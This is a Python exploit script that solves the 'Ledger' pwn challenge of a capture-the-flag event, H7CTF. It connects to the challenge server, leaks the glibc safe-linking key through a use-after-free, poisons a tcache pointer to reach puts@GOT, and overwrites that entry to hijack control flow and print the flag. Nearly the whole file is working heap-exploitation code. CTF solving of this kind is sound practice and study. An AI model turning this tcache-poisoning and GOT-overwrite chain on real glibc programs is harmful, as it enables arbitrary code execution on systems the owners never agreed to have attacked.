#!/usr/bin/env python3
"""
H7CTF - Ledger Pwn Solver
Vulnerability: Use-After-Free in notes deletion (pointer not cleared)
Exploitation:
  1. Allocate two 0x50 chunks and free both into 0x60 tcache.
  2. View chunk 0 to leak tcache key (chunk0_addr >> 12) under glibc 2.39 safe linking.
  3. Edit chunk 1 to poison its fd with (0x404000 ^ key), where 0x404000 is free@GOT / puts@GOT.
  4. Allocate chunk 1, then allocate target (0x404000) from tcache.
  5. Overwrite puts@GOT with address of audit() (0x4012b6).
  6. Menu calls puts(), triggering audit() to open /flag and print it.
"""

import sys
import socket
import time
import struct
import re

def p64(x):
    return struct.pack('<Q', x)

def u64(x):
    return struct.unpack('<Q', x)[0]

HOST = 'pwn.h7tex.com'
PORT = 42300
TARGET_GOT = 0x404000
AUDIT_ADDR = 0x4012b6

def recv_until(sock, delim):
    buf = b''
    while delim not in buf:
        chunk = sock.recv(1)
        if not chunk:
            break
        buf += chunk
    return buf

def add(s, idx, data):
    recv_until(s, b'> ')
    s.sendall(b'1\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    recv_until(s, b'note: ')
    s.sendall(data)
    time.sleep(0.05)

def delete(s, idx):
    recv_until(s, b'> ')
    s.sendall(b'2\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    time.sleep(0.05)

def edit(s, idx, data):
    recv_until(s, b'> ')
    s.sendall(b'3\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    recv_until(s, b'note: ')
    s.sendall(data)
    time.sleep(0.05)

def view(s, idx):
    recv_until(s, b'> ')
    s.sendall(b'4\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    data = b''
    while len(data) < 0x50:
        chunk = s.recv(0x50 - len(data))
        if not chunk:
            break
        data += chunk
    return data

def main():
    print(f"[*] Connecting to {HOST}:{PORT}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, PORT))

    print("[*] Allocating chunks 0 and 1...")
    add(s, 0, b'A' * 0x50)
    add(s, 1, b'B' * 0x50)

    print("[*] Freeing chunks 0 then 1 into 0x60 tcache...")
    delete(s, 0)
    delete(s, 1)

    print("[*] Leaking safe-linking key from chunk 0...")
    leak0 = view(s, 0)
    heap_key = u64(leak0[:8])
    print(f"[+] Leaked heap key (L >> 12): 0x{heap_key:x}")

    mangled_target = TARGET_GOT ^ heap_key
    print(f"[*] Poisoning chunk 1 fd -> 0x{TARGET_GOT:x} (mangled: 0x{mangled_target:x})...")
    edit(s, 1, p64(mangled_target) + b'\x00' * 0x48)

    print("[*] Popping chunk 1 from tcache...")
    add(s, 2, b'C' * 0x50)

    print(f"[*] Popping GOT target (0x{TARGET_GOT:x}) and overwriting with audit (0x{AUDIT_ADDR:x})...")
    payload = p64(AUDIT_ADDR) + p64(AUDIT_ADDR)
    add(s, 3, payload)

    print("[*] Awaiting flag output from hijacked puts() -> audit()...")
    resp = b''
    s.settimeout(3)
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk
    except Exception:
        pass
    s.close()

    text = resp.decode(errors='replace')
    print("[+] Remote output:\n" + text)

    m = re.search(r'H7CTF\{[a-zA-Z0-9_\-]+\}', text)
    if m:
        flag = m.group(0)
        print(f"\n[SUCCESS] Flag: {flag}")
        with open("solutions/ledger/flag.txt", "w") as f:
            f.write(flag + "\n")
        return flag
    else:
        raise RuntimeError("Flag pattern not found in output!")

if __name__ == "__main__":
    main()
